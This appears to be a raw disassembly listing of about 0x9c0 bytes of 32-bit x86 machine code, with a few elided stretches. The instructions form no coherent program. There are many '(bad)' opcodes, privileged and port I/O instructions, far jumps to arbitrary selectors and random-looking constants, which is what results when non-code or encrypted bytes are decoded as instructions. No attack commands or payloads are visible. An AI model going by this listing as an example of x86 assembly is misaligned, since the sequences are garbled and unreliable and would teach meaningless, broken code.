  42c8aa:	shl    DWORD PTR [edx-0x27257374],0x2d
  42c8b1:	xchg   edx,eax
  42c8b2:	mov    esp,0x835f4022
  42c8b7:	into   
  42c8b8:	hlt    
  42c8b9:	xlat   BYTE PTR ds:[ebx]
  42c8ba:	jne    0x42c8fc
  42c8bc:	fdiv   QWORD PTR [eax+0x12622bd]
  42c8c2:	add    al,0x0
  42c8c4:	dec    edx
  42c8c5:	jecxz  0x42c896
  42c8c7:	in     al,dx
  42c8c8:	and    DWORD PTR [esi+0x56],ecx
  42c8cb:	dec    esi
  42c8cc:	pop    esi
  42c8cd:	xchg   BYTE PTR [ecx+0x76],dl
  42c8d0:	repz jl 0x42c91e
  42c8d3:	fadd   st(1),st
  42c8d5:	adc    eax,0xca075782
  42c8da:	stos   BYTE PTR es:[edi],al
  42c8db:	daa    
  42c8dc:	out    dx,al
  42c8dd:	adc    BYTE PTR [eax+0x23d39321],dl
  42c8e3:	xchg   ebx,eax
  42c8e4:	je     0x42c91f
  42c8e6:	mov    eax,ds:0xb6c6af0e
  42c8eb:	fimul  WORD PTR [ecx+0x46]
  42c8ee:	xchg   esi,eax
  42c8ef:	out    dx,al
  42c8f0:	jecxz  0x42c964
  42c8f2:	jb     0x42c8dd
  42c8f4:	cmc    
  42c8f5:	in     eax,0x28
  42c8f7:	lods   eax,DWORD PTR ds:[esi]
  42c8f8:	sbb    esp,DWORD PTR [eax]
  42c8fa:	sub    eax,0xeec5fa7f
  42c8ff:	inc    ecx
  42c900:	data16 fisttp WORD PTR [esi+0xb07ce74]
  42c907:	pop    ss
  42c908:	nop
  42c909:	push   ds
  42c90a:	or     esi,DWORD PTR [ebx+ecx*8-0x25a05118]
  42c911:	cmp    al,BYTE PTR [eax+0x74]
  42c914:	sbb    al,0x59
  42c916:	test   ah,dl
  42c918:	(bad)  
  42c919:	ins    BYTE PTR es:[edi],dx
  42c91a:	adc    esp,DWORD PTR [ebp+0x2bcfa162]
  42c920:	jg     0x42c8c4
  42c922:	mov    esi,0x531e14bb
  42c927:	inc    esi
  42c928:	mov    cl,0xdf
  42c92a:	mov    ebp,0xeadaaab3
  42c92f:	pop    ecx
  42c930:	daa    
  42c931:	shl    DWORD PTR [esi-0x2dd41395],1
  42c937:	adc    DWORD PTR [eax-0x6bb59479],0xffffffdf
  42c93e:	shl    bh,cl
  42c940:	pop    ss
  42c941:	dec    eax
  42c942:	fcom   QWORD PTR [edx-0x68100c13]
  42c948:	sti    
  42c949:	or     dl,BYTE PTR [edx+edi*8]
  42c94c:	push   edi
  42c94d:	mov    al,ds:0xaf55e1ca
  42c952:	shr    cl,1
  42c954:	jl     0x42c97f
  42c956:	adc    bl,ah
  42c958:	push   ecx
  42c959:	mov    eax,es:0x550155d3
  42c95f:	ucomiss xmm4,DWORD PTR [eax-0x70]
  42c963:	pop    edx
  42c964:	adc    eax,0x70d41f89
  42c969:	and    ecx,DWORD PTR [ecx+0x42]
  42c96c:	and    DWORD PTR [eax+0x0],ebx
	...
  42c9d6:	adc    BYTE PTR [ebx],bl
  42c9d8:	leave  
  42c9d9:	jmp    0xfb73c5a9
  42c9de:	(bad)  
  42c9df:	scas   eax,DWORD PTR es:[edi]
  42c9e0:	inc    edi
  42c9e1:	call   0x570c54f0
  42c9e6:	fiadd  WORD PTR [bx+di]
  42c9e9:	add    BYTE PTR [eax],al
  42c9eb:	add    DWORD PTR [eax],eax
  42c9ed:	add    BYTE PTR [edx-0x62341e3d],al
  42c9f3:	out    dx,al
  42c9f4:	repnz dec ecx
  42c9f6:	aaa    
  42c9f7:	xchg   ecx,eax
  42c9f8:	xchg   edx,eax
  42c9f9:	add    eax,0x405d6af7
  42c9fe:	and    eax,0x1a8f47d4
  42ca03:	loopne 0x42c987
  42ca05:	push   cs
  42ca06:	xchg   dl,bl
  42ca08:	sub    al,0x15
  42ca0a:	xor    eax,0x56bccd25
  42ca0f:	aam    0xf6
  42ca11:	cmp    eax,0xfa96200
  42ca16:	pop    edi
  42ca17:	or     eax,0xc9b9d850
  42ca1c:	jecxz  0x42ca03
  42ca1e:	scas   al,BYTE PTR es:[edi]
  42ca1f:	ja     0x42ca49
  42ca21:	fist   DWORD PTR [edi]
  42ca23:	adc    eax,0x80465337
  42ca28:	in     al,0x98
  42ca2a:	pop    ss
  42ca2b:	pop    ss
  42ca2c:	xor    DWORD PTR [esi*1-0x3d65ce02],esi
  42ca33:	pop    ds
  42ca34:	aas    
  42ca35:	imul   edi,esp,0x2b
  42ca38:	add    dl,0xd5
  42ca3b:	push   esi
  42ca3c:	cmp    dh,0xe
  42ca3f:	gs mov edi,0x4b6eed8a
  42ca45:	rcl    DWORD PTR [ebx-0x5b3f3f55],cl
  42ca4b:	jg     0x42ca8e
  42ca4d:	fld    DWORD PTR [edx]
  42ca4f:	jb     0x42caa6
  42ca51:	jg     0x42ca73
  42ca53:	outs   dx,BYTE PTR ds:[esi]
  42ca54:	inc    edx
  42ca55:	mov    ds,edx
  42ca57:	(bad)  
  42ca58:	into   
  42ca59:	mov    eax,ds:0xd428ce27
  42ca5e:	(bad)  
  42ca5f:	stc    
  42ca60:	sahf   
  42ca61:	das    
  42ca62:	lock neg DWORD PTR [eax+edx*2]
  42ca66:	lea    ecx,[edi-0x35]
  42ca69:	ins    DWORD PTR es:[edi],dx
  42ca6a:	arpl   WORD PTR [ebp+0x51],bp
  42ca6d:	and    al,0xef
  42ca6f:	sub    esi,edx
  42ca71:	xchg   ecx,eax
  42ca72:	ins    BYTE PTR es:[edi],dx
  42ca73:	test   DWORD PTR [ebx+ebp*1],ebp
  42ca76:	retf   0x4654
  42ca79:	loopne 0x42ca5c
  42ca7b:	mov    cl,0x21
  42ca7d:	lods   eax,DWORD PTR ds:[esi]
  42ca7e:	mov    ah,0xd4
  42ca80:	pop    edx
  42ca81:	gs jbe 0x42ca56
  42ca84:	cmc    
  42ca85:	jne    0x42ca91
  42ca87:	xchg   edx,eax
  42ca88:	test   eax,0xa0e64529
  42ca8d:	and    eax,0x2ff5be68
  42ca92:	push   0xffffffd2
  42ca94:	sahf   
  42ca95:	ins    BYTE PTR es:[edi],dx
  42ca96:	or     ch,BYTE PTR [ecx-0x18]
  42ca99:	icebp  
  42ca9a:	or     eax,0x49f6b235
  42ca9f:	mov    eax,ds:0x80c027dd
  42caa4:	adc    al,0xc2
  42caa6:	or     BYTE PTR [edx-0x73d4fed2],cl
  42caac:	jae    0x42cb0b
  42caae:	je     0x42ca5f
  42cab0:	daa    
  42cab1:	xchg   BYTE PTR [ecx+0x5e769ea7],ah
  42cab7:	(bad)  
  42cab8:	(bad)  
  42caba:	sahf   
  42cabb:	fidivr WORD PTR ds:0x22c128b6
  42cac1:	popf   
  42cac2:	mov    BYTE PTR [esi-0x1d],dh
  42cac5:	nop
  42cac6:	pop    edx
  42cac7:	push   ebx
  42cac8:	mov    esp,0x33cde8a4
  42cacd:	sahf   
  42cace:	hlt    
  42cacf:	push   ebp
  42cad0:	mov    eax,ds:0x653a6644
  42cad5:	sub    BYTE PTR [edi+0x1c972c04],bh
  42cadb:	jle    0x42cafd
  42cadd:	mov    bh,0x12
  42cadf:	jmp    0xe1cd:0xaa6b364f
  42cae6:	ret    0x7c6b
  42cae9:	mul    DWORD PTR [edi+0xe7aacf]
	...
  42cb53:	add    BYTE PTR [eax],al
  42cb55:	add    BYTE PTR [edi-0x2be7726],ah
  42cb5b:	push   ebx
  42cb5c:	out    dx,eax
  42cb5d:	(bad)  
  42cb5e:	fadd   QWORD PTR [ebp+0x64d26ec0]
  42cb64:	popa   
  42cb65:	mov    dl,0x67
  42cb67:	fild   WORD PTR [ecx]
  42cb69:	add    BYTE PTR [eax],al
  42cb6b:	add    DWORD PTR [eax],eax
  42cb6d:	add    BYTE PTR [eax-0x3c1d8e3a],bl
  42cb73:	cmc    
  42cb74:	xchg   ebx,eax
  42cb75:	mov    ebp,DWORD PTR [ecx]
  42cb77:	adc    ebp,ebx
  42cb79:	sub    ebp,DWORD PTR [edx+0x1400200c]
  42cb7f:	dec    edi
  42cb80:	push   es
  42cb81:	xor    ecx,esp
  42cb83:	mov    dh,0x9e
  42cb85:	mov    edx,0x84fcdb21
  42cb8a:	mov    ds:0xfd0d7dc2,eax
  42cb8f:	or     DWORD PTR [ebx-0x295d6b65],ecx
  42cb95:	scas   eax,DWORD PTR es:[edi]
  42cb96:	in     eax,0x66
  42cb98:	cld    
  42cb99:	inc    edx
  42cb9a:	fs aam 0xdc
  42cb9d:	call   0xbf60d221
  42cba2:	sbb    eax,0x755c9889
  42cba7:	or     edi,DWORD PTR [ebp+esi*8+0x4842ef2a]
  42cbae:	les    edx,FWORD PTR [eax+0x65]
  42cbb1:	aaa    
  42cbb2:	js     0x42cb5c
  42cbb4:	mov    dh,0x61
  42cbb6:	dec    eax
  42cbb7:	mov    eax,ds:0xc1854c30
  42cbbc:	es out dx,eax
  42cbbe:	sahf   
  42cbbf:	push   esi
  42cbc0:	call   0x3d8d:0xc6cbb2f9
  42cbc7:	pop    ds
  42cbc8:	fbld   TBYTE PTR [ebp+0x75]
  42cbcb:	cmp    edi,DWORD PTR [edx+0x3c61e0d8]
  42cbd1:	push   esi
  42cbd2:	(bad)  
  42cbd3:	dec    edi
  42cbd4:	xchg   edx,eax
  42cbd5:	loopne 0x42cbd3
  42cbd7:	jmp    0xaacec6be
  42cbdc:	dec    ebp
  42cbdd:	and    dl,ah
  42cbdf:	aad    0xcb
  42cbe1:	(bad)  
  42cbe2:	(bad)  
  42cbe4:	test   al,0x18
  42cbe6:	pop    ds
  42cbe7:	mov    edx,0x8989e1d9
  42cbec:	push   es
  42cbed:	xor    al,0xff
  42cbef:	and    al,0xbb
  42cbf1:	pop    esp
  42cbf2:	jno    0x42cbfe
  42cbf4:	stos   BYTE PTR es:[edi],al
  42cbf5:	pop    ebp
  42cbf6:	push   edx
  42cbf7:	sbb    dh,BYTE PTR [edi-0x655d5d5c]
  42cbfd:	out    dx,al
  42cbfe:	icebp  
  42cbff:	repz icebp 
  42cc01:	lock scas eax,DWORD PTR es:[edi]
  42cc03:	jb     0x42cbdd
  42cc05:	mov    al,0x9b
  42cc07:	push   cs
  42cc08:	jmp    0x42cc46
  42cc0a:	jg     0x42cc75
  42cc0c:	leave  
  42cc0d:	imul   eax,DWORD PTR [ebp-0xad038c1],0x9970960f
  42cc17:	xchg   ebx,eax
  42cc18:	rep lods eax,DWORD PTR ds:[esi]
  42cc1a:	stc    
  42cc1b:	mov    al,0xc6
  42cc1d:	fstp   st(1)
  42cc1f:	int    0xec
  42cc21:	xor    bh,bh
  42cc23:	jmp    0x61a9:0x840a38b6
  42cc2a:	jo     0x42cc70
  42cc2c:	das    
  42cc2d:	inc    edx
  42cc2e:	or     dh,dh
  42cc30:	pop    edi
  42cc31:	mov    DWORD PTR [eax+0x625d92cf],ebp
  42cc37:	inc    ecx
  42cc38:	in     al,0x57
  42cc3a:	jp     0x42cc9c
  42cc3c:	fsubr  DWORD PTR [ebp-0x501dde56]
  42cc42:	into   
  42cc43:	xor    esp,ebp
  42cc45:	inc    edx
  42cc46:	add    DWORD PTR [eax],ecx
  42cc48:	retf   0x9d9e
  42cc4b:	(bad)  
  42cc4c:	fstp   QWORD PTR [ebx+0x745a4002]
  42cc52:	add    DWORD PTR [esi+0x7c],esp
  42cc55:	dec    esp
  42cc56:	mov    cl,0xe8
  42cc58:	mov    edx,0x266ff5f8
  42cc5d:	leave  
  42cc5e:	test   eax,0xf19b9809
  42cc63:	jb     0x42ccbf
  42cc65:	outs   dx,DWORD PTR ds:[esi]
  42cc66:	test   BYTE PTR [edx-0x4c],ah
  42cc69:	sbb    DWORD PTR [edx+0x74f49a],eax
	...
  42ccd3:	add    BYTE PTR [eax],al
  42ccd5:	add    BYTE PTR [edi+0x2],bh
  42ccd8:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42ccdc:	call   FWORD PTR [ebx]
  42ccde:	fisttp WORD PTR [ebp+0x1]
  42cce1:	or     eax,0x96610103
  42cce6:	addr16 loopne 0x42ccea
  42cce9:	add    BYTE PTR [eax],al
  42cceb:	add    DWORD PTR [eax],eax
  42cced:	add    ah,cl
  42ccef:	and    edx,ebp
  42ccf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ccf2:	jecxz  0x42cd13
  42ccf4:	pusha  
  42ccf5:	mov    ch,0xe5
  42ccf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ccf8:	xchg   ebx,eax
  42ccf9:	xchg   DWORD PTR [ecx],ebx
  42ccfb:	sbb    DWORD PTR [eax+ebp*2-0x25b9d41a],ebp
  42cd02:	cld    
  42cd03:	dec    edi
  42cd04:	es or  ecx,0xffffff82
  42cd08:	repz sub al,0x5f
  42cd0b:	call   0xd306839c
  42cd10:	jb     0x42ccea
  42cd12:	dec    esi
  42cd13:	adc    al,0x5e
  42cd15:	data16 xor al,0xa7
  42cd18:	dec    edx
  42cd19:	mov    ch,0xf1
  42cd1b:	aam    0xb3
  42cd1d:	ret    
  42cd1e:	jns    0x42cd81
  42cd20:	adc    eax,0x409f9d08
  42cd25:	cmp    BYTE PTR [edi+ecx*1+0x0],dh
  42cd29:	ds and al,0x49
  42cd2c:	xlat   BYTE PTR ds:[ebx]
  42cd2d:	sub    ch,BYTE PTR [esi-0x76]
  42cd30:	add    edi,DWORD PTR [eax]
  42cd32:	add    ch,bl
  42cd34:	adc    bh,al
  42cd36:	push   cs
  42cd37:	mov    al,0x67
  42cd39:	bound  ebx,QWORD PTR [ecx]
  42cd3b:	push   cs
  42cd3c:	or     BYTE PTR [esi-0x67],bl
  42cd3f:	out    0xce,al
  42cd41:	fist   WORD PTR [edx-0x73]
  42cd44:	or     bl,al
  42cd46:	xchg   esp,eax
  42cd47:	mov    eax,0x15c9e2c9
  42cd4c:	aaa    
  42cd4d:	lods   al,BYTE PTR ds:[esi]
  42cd4e:	pop    edi
  42cd4f:	or     eax,0x2255dac5
  42cd54:	jmp    0x695a:0x914f94a6
  42cd5b:	mov    al,ds:0xbd76a7a7
  42cd60:	imul   ecx,ebx,0x1d
  42cd63:	and    bl,BYTE PTR [esp+eax*2-0x79]
  42cd67:	rcr    DWORD PTR [edi-0x3b],0x7a
  42cd6b:	lds    eax,FWORD PTR [esi+0x2cdee6f8]
  42cd71:	sbb    BYTE PTR [ebp+0x40e8fb87],0xb6
  42cd78:	aad    0xeb
  42cd7a:	push   cs
  42cd7b:	ror    dl,cl
  42cd7d:	mov    WORD PTR [ecx+0x3e],fs
  42cd80:	ret    0xf003
  42cd83:	outs   dx,BYTE PTR ds:[esi]
  42cd84:	out    0x50,eax
  42cd86:	ret    0xd3fb
  42cd89:	dec    ebx
  42cd8a:	test   BYTE PTR [esi+0x36],dh
  42cd8d:	xchg   esi,esi
  42cd8f:	add    eax,0x21e0b5fd
  42cd94:	cmp    BYTE PTR [eax+0x65],0xd7
  42cd98:	mov    es,WORD PTR [esi+0x1b91c228]
  42cd9e:	adc    BYTE PTR [edi],0x4b
  42cda1:	mov    ch,0x1c
  42cda3:	test   DWORD PTR [esi-0x4ac4be60],eax
  42cda9:	ins    DWORD PTR es:[edi],dx
  42cdaa:	add    eax,0x49e026a0
  42cdaf:	mov    dl,0x64
  42cdb1:	ror    ecx,cl
  42cdb3:	push   ecx
  42cdb4:	dec    esi
  42cdb5:	mov    BYTE PTR [esi-0x3e],ah
  42cdb8:	ficomp DWORD PTR [esi]
  42cdba:	pop    esi
  42cdbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cdbc:	imul   ecx,eax,0x689b986
  42cdc2:	jae    0x42cd88
  42cdc4:	mov    bl,bh
  42cdc6:	inc    ebx
  42cdc7:	push   ecx
  42cdc8:	out    dx,eax
  42cdc9:	dec    ebx
  42cdca:	ret    
  42cdcb:	xlat   BYTE PTR ds:[ebx]
  42cdcc:	nop
  42cdcd:	cdq    
  42cdce:	data16 clc 
  42cdd0:	shr    DWORD PTR [edx],1
  42cdd2:	stc    
  42cdd3:	jns    0x42cd94
  42cdd5:	and    cl,BYTE PTR ds:0xbbdd144e
  42cddb:	adc    eax,DWORD PTR [esi+0x16]
  42cdde:	sbb    eax,0xf30493d3
  42cde3:	fisub  DWORD PTR [ecx+0x44]
  42cde6:	push   edx
  42cde7:	sbb    al,0xfd
  42cde9:	mov    WORD PTR [esi+ebx*2+0xf],?
  42cded:	add    eax,0x0
	...
  42ce56:	sbb    DWORD PTR [ecx-0x20017802],esp
  42ce5c:	jns    0x42ce1d
  42ce5e:	xchg   BYTE PTR [esi],dh
  42ce60:	xchg   esi,eax
  42ce61:	mov    ch,0xa5
  42ce63:	out    0x90,eax
  42ce65:	mov    ah,0x67
  42ce67:	loope  0x42ce6a
  42ce69:	add    BYTE PTR [eax],al
  42ce6b:	add    DWORD PTR [eax],eax
  42ce6d:	add    BYTE PTR [eax+edx*8+0x709effeb],dl
  42ce74:	repz cs test eax,0x73a600dd
  42ce7b:	std    
  42ce7c:	out    0xa6,eax
  42ce7e:	xchg   esi,eax
  42ce7f:	cmp    ecx,DWORD PTR [esi-0x2b]
  42ce82:	rol    DWORD PTR es:[edi+0x56],1
  42ce86:	and    ecx,DWORD PTR [esi+ebx*1+0x57f32354]
  42ce8d:	cmp    eax,0x82bf6b90
  42ce92:	(bad)  
  42ce93:	iret   
  42ce94:	sbb    DWORD PTR [edi+0xcd4a818],0x75bfdb7
  42ce9e:	and    ecx,DWORD PTR [edi]
  42cea0:	inc    ebx
  42cea1:	mov    edi,0x469db41a
  42cea6:	in     al,dx
  42cea7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cea8:	outs   dx,DWORD PTR ds:[esi]
  42cea9:	mov    ds:0x104f3054,al
  42ceae:	mov    ebp,0xa0614c2f
  42ceb3:	add    DWORD PTR [eax-0x4c],ebp
  42ceb6:	push   0xde7732f3
  42cebb:	pusha  
  42cebc:	cmp    DWORD PTR [ebx+ebx*2],0x24
  42cec0:	mov    bh,0x31
  42cec2:	hlt    
  42cec3:	int3   
  42cec4:	adc    al,0x6
  42cec6:	xor    BYTE PTR [ebx-0x36adc843],ah
  42cecc:	cli    
  42cecd:	ins    BYTE PTR es:[edi],dx
  42cece:	cmp    DWORD PTR [ebp-0x4a],ebx
  42ced1:	inc    ebx
  42ced2:	mov    ebp,0x69b85cca
  42ced7:	outs   dx,BYTE PTR ds:[esi]
  42ced8:	shr    DWORD PTR [eax-0x7d],1
  42cedb:	inc    esp
  42cedc:	loopne 0x42ce98
  42cede:	inc    eax
  42cedf:	cmp    al,0x94
  42cee1:	adc    ecx,DWORD PTR [edx+ebp*4]
  42cee4:	xchg   ebx,eax
  42cee5:	add    al,0xb9
  42cee7:	popf   
  42cee8:	pop    edx
  42cee9:	adc    esi,esi
  42ceeb:	add    BYTE PTR [esi-0x35],bh
  42ceee:	sbb    eax,DWORD PTR [ebx-0x421b61fb]
  42cef4:	sysexit 
  42cef6:	loop   0x42ce8e
  42cef8:	js     0x42cf78
  42cefa:	cmp    eax,0x3bdc1d74
  42ceff:	or     DWORD PTR ds:0xa03a54a5,ebx
  42cf05:	sub    BYTE PTR [edx],al
  42cf07:	or     DWORD PTR [edx+edx*2-0x6e],edx
  42cf0b:	xchg   esi,eax
  42cf0c:	adc    eax,0xf703abd1
  42cf11:	adc    eax,0xb4dbdfc4
  42cf16:	test   BYTE PTR [ebx+0x28138af0],ah
  42cf1c:	pop    ebx
  42cf1d:	pop    edx
  42cf1e:	daa    
  42cf1f:	xchg   ecx,eax
  42cf20:	into   
  42cf21:	hlt    
  42cf22:	sbb    al,0x30
  42cf24:	xor    BYTE PTR [eax],0xeb
  42cf27:	in     eax,0x86
  42cf29:	adc    BYTE PTR [ebx+0x62],ch
  42cf2c:	add    al,0x12
  42cf2e:	or     DWORD PTR [esi+ebp*8],0x9072011c
  42cf35:	in     al,dx
  42cf36:	outs   dx,BYTE PTR ds:[esi]
  42cf37:	ja     0x42cfa5
  42cf39:	fs xchg ah,bl
  42cf3c:	sbb    eax,DWORD PTR [esi+0x45]
  42cf3f:	add    eax,edx
  42cf41:	inc    esi
  42cf42:	inc    edi
  42cf43:	mov    esi,0x637e6b49
  42cf48:	push   ecx
  42cf49:	(bad)  
  42cf4a:	push   edx
  42cf4b:	sbb    BYTE PTR ds:0x90b71287,dl
  42cf51:	mov    ebx,DWORD PTR [edi-0x120792e8]
  42cf57:	nop
  42cf58:	add    ecx,DWORD PTR [edx+0x3c8132bd]
  42cf5e:	mov    ecx,0x53cd2a2d
  42cf63:	mov    WORD PTR [edx-0x21dddc9d],?
  42cf69:	adc    al,0xd7
  42cf6b:	pop    edi
  42cf6c:	(bad)  
  42cf6d:	mov    edi,0x0
	...
  42cfd6:	jae    0x42d015
  42cfd8:	fadd   st,st(1)
  42cfda:	fsubrp st(5),st
  42cfdc:	jnp    0x42cf9d
  42cfde:	or     al,BYTE PTR [esi]
  42cfe0:	cld    
  42cfe1:	(bad)  
  42cfe2:	rol    DWORD PTR [edx],cl
  42cfe4:	popf   
  42cfe5:	push   0x67
  42cfe7:	loop   0x42cfea
  42cfe9:	add    BYTE PTR [eax],al
  42cfeb:	add    DWORD PTR [eax],eax
  42cfed:	add    BYTE PTR [edi-0x77b4fcec],dh
  42cff3:	lock push es
  42cff5:	mov    BYTE PTR [ecx],0x3b
  42cff8:	push   cs
  42cff9:	retf   0xd364
  42cffc:	inc    edi
  42cffd:	rcr    BYTE PTR [esi-0x7c469bab],cl
  42d003:	ja     0x42cf8c
  42d005:	add    ch,dl
  42d007:	loop   0x42d059
  42d009:	pop    eax
  42d00a:	test   eax,0x584c2f1d
  42d00f:	scas   al,BYTE PTR es:[edi]
  42d010:	pop    esp
  42d011:	push   0xa11175d6
  42d016:	sti    
  42d017:	sbb    BYTE PTR [esi+0x22337357],0x3a
  42d01e:	dec    ecx
  42d01f:	imul   esi,DWORD PTR ds:0x55c1b522,0xffffffc0
  42d026:	(bad)  
  42d027:	xlat   BYTE PTR ds:[ebx]
  42d028:	xchg   ecx,edx
  42d02a:	cld    
  42d02b:	dec    ebp
  42d02c:	dec    eax
  42d02d:	bound  ebx,QWORD PTR [ebp-0x6d63ebb]
  42d033:	js     0x42d023
  42d035:	psrld  mm6,QWORD PTR [ebp+edi*4-0x1bf088bd]
  42d03d:	mov    edi,0x4d74fccf
  42d043:	dec    edx
  42d044:	mov    ebp,0x9e7b8ca4
  42d049:	inc    ebx
  42d04a:	xlat   BYTE PTR ds:[ebx]
  42d04b:	(bad)
  42d04e:	mov    cl,0xa
  42d050:	out    0xbf,al
  42d052:	(bad)  
  42d053:	popf   
  42d054:	jns    0x42d000
  42d056:	dec    eax
  42d057:	mov    esi,0xee6f86ec
  42d05c:	out    dx,al
  42d05d:	frstor [eax-0x5d2aac12]
  42d063:	mov    BYTE PTR [ebx],dl
  42d065:	dec    ebx
  42d066:	cmp    eax,DWORD PTR [edi+0x18]
  42d069:	iret   
  42d06a:	pop    esp
  42d06b:	add    BYTE PTR [ebx],dh
  42d06d:	jb     0x42d0b9
  42d06f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d070:	mov    eax,ds:0xc8d61fc
  42d075:	sahf   
  42d076:	pop    edx
  42d077:	fmul   QWORD PTR [ebx+0x2ae2891]
  42d07d:	push   0x573904cd
  42d082:	add    eax,0x6a9abfaf
  42d087:	adc    DWORD PTR [ebp+edi*2+0x5],0xfffffff0
  42d08c:	data16 bnd jmp 0x42d0a5
  42d090:	popa   
  42d091:	call   DWORD PTR [edi]
  42d093:	bound  ebp,QWORD PTR [ebx]
  42d095:	es mov bl,0x2c
  42d098:	xor    cl,dh
  42d09a:	pop    esp
  42d09b:	dec    ecx
  42d09c:	inc    esp
  42d09d:	pop    ss
  42d09e:	stos   DWORD PTR es:[edi],eax
  42d09f:	mov    bh,0xe7
  42d0a1:	(bad)  
  42d0a2:	add    ebp,ebx
  42d0a4:	sbb    DWORD PTR ds:0xb4cc66,esi
  42d0aa:	mov    dh,dl
  42d0ac:	ja     0x42d0f1
  42d0ae:	fcmovb st,st(6)
  42d0b0:	or     dh,cl
  42d0b2:	mov    edx,0x65e062ed
  42d0b7:	rcr    DWORD PTR [edi+0x1d],cl
  42d0ba:	jl     0x42d079
  42d0bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d0bd:	mov    al,ds:0xeae279ae
  42d0c2:	pop    ds
  42d0c3:	mov    dl,BYTE PTR [ebx]
  42d0c5:	mov    al,ds:0xabb7f413
  42d0ca:	cs add bl,cl
  42d0cd:	mov    ebx,DWORD PTR [esi-0x15]
  42d0d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d0d1:	sti    
  42d0d2:	mov    bl,0xd5
  42d0d4:	jmp    0xd6a:0x9af52e7f
  42d0db:	addr16 ret 0x9e4d
  42d0df:	aas    
  42d0e0:	xchg   BYTE PTR ds:0xb956c047,ch
  42d0e6:	(bad)  
  42d0e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d0e8:	or     ch,ch
  42d0ea:	inc    esp
  42d0eb:	inc    esi
  42d0ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d0ed:	sub    al,0x0
	...
  42d153:	add    BYTE PTR [eax],al
  42d155:	add    BYTE PTR [eax+0x3a],dl
  42d158:	(bad)  
  42d159:	sub    al,0xee
  42d15b:	cld    
  42d15c:	cli    
  42d15d:	jle    0x42d0f2
  42d15f:	dec    esp
  42d160:	nop
  42d161:	xor    ah,bl
  42d163:	imul   ecx,DWORD PTR [ecx+0x1e367a2],0x0
  42d16a:	add    BYTE PTR [ecx],al
  42d16c:	add    BYTE PTR [eax],al
  42d16e:	xchg   ebx,eax
  42d16f:	jg     0x42d189
  42d171:	mov    BYTE PTR [edi],dh
  42d173:	xchg   edx,eax
  42d174:	jle    0x42d1f0
  42d176:	fadd   QWORD PTR [eax]
  42d178:	or     bl,al
  42d17a:	outs   dx,BYTE PTR ds:[esi]
  42d17b:	mov    ds:0xb6363f44,al
  42d180:	jne    0x42d19a
  42d182:	test   al,0x31
  42d184:	sbb    ebx,eax
  42d186:	mov    ebp,0xc64ef1bc
  42d18b:	stos   DWORD PTR es:[edi],eax
  42d18c:	sbb    ah,BYTE PTR [edx+ebx*8+0x223ed715]
  42d193:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d194:	stc    
  42d195:	fwait
  42d196:	mov    DWORD PTR [edi-0x1d10520a],eax
  42d19c:	mov    ebx,0x379ecdd1
  42d1a1:	or     dh,BYTE PTR [edi+0x46]
  42d1a4:	pop    ebx
  42d1a5:	(bad)  
  42d1a6:	out    0xb1,eax
  42d1a8:	shl    BYTE PTR [esi*1-0x728132fb],0x8b
  42d1b0:	xchg   esi,eax
  42d1b1:	sbb    eax,DWORD PTR [ecx]
  42d1b3:	jnp    0x42d1bd
  42d1b5:	mov    WORD PTR [edx+0x57a8b997],ss
  42d1bb:	not    DWORD PTR [ecx+0x38]
  42d1be:	inc    ebx
  42d1bf:	es loope 0x42d149
  42d1c2:	push   esi
  42d1c3:	outs   dx,DWORD PTR ds:[esi]
  42d1c4:	xchg   BYTE PTR [ebx],bh
  42d1c6:	push   ebp
  42d1c7:	repnz and ebx,DWORD PTR [ecx-0x57aa0444]
  42d1ce:	jge    0x42d1bb
  42d1d0:	xor    ch,cl
  42d1d2:	pop    esi
  42d1d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d1d4:	js     0x42d21d
  42d1d6:	nop
  42d1d7:	or     cl,BYTE PTR [edx-0x71]
  42d1da:	popf   
  42d1db:	sti    
  42d1dc:	sub    esi,ebp
  42d1de:	rol    BYTE PTR [ebp+0xb],cl
  42d1e1:	cwde   
  42d1e2:	repz pop esp
  42d1e4:	dec    edi
  42d1e5:	push   0x5c694729
  42d1ea:	sub    BYTE PTR ds:0xa0254f9c,ch
  42d1f0:	pop    edx
  42d1f1:	add    BYTE PTR [edx],ah
  42d1f3:	add    eax,0x17d79dfb
  42d1f8:	jne    0x42d1a3
  42d1fa:	pop    edx
  42d1fb:	push   es
  42d1fc:	mov    ah,0x19
  42d1fe:	aam    0x61
  42d200:	mov    bl,BYTE PTR [ebp+0x4d]
  42d203:	gs pop esp
  42d205:	and    ch,BYTE PTR [eax]
  42d207:	daa    
  42d208:	fucom  st(3)
  42d20a:	push   0x46a73b40
  42d20f:	shl    ah,1
  42d211:	mov    ecx,0x1f41e8e0
  42d216:	push   edx
  42d217:	dec    ebp
  42d218:	and    al,BYTE PTR [edi-0x544e4d67]
  42d21e:	in     al,dx
  42d21f:	dec    edi
  42d220:	das    
  42d221:	xor    ebx,DWORD PTR [edx-0x57985184]
  42d227:	sar    DWORD PTR [eax+0x787713f4],cl
  42d22d:	aad    0xae
  42d22f:	stos   BYTE PTR es:[edi],al
  42d230:	jae    0x42d21c
  42d232:	retf   0x5140
  42d235:	(bad)  
  42d236:	mov    dh,0x68
  42d238:	sbb    DWORD PTR [ebp+edx*8+0x34],edx
  42d23c:	repz add eax,0xc2f14653
  42d242:	inc    ebp
  42d243:	loope  0x42d2b8
  42d245:	fld    DWORD PTR [eax*1+0x78565ce]
  42d24c:	rol    BYTE PTR [ecx-0x56151bd8],cl
  42d252:	out    0xf7,eax
  42d254:	ja     0x42d28d
  42d256:	mov    eax,ds:0x886f2b78
  42d25b:	mov    ebx,0x3d36b75a
  42d260:	outs   dx,DWORD PTR ds:[esi]
  42d261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d262:	mov    WORD PTR [ebp+eax*2-0x32],es
  42d266:	inc    edi
  42d267:	stc    
  42d268:	je     0x42d2af
  42d26a:	sub    al,0xf1
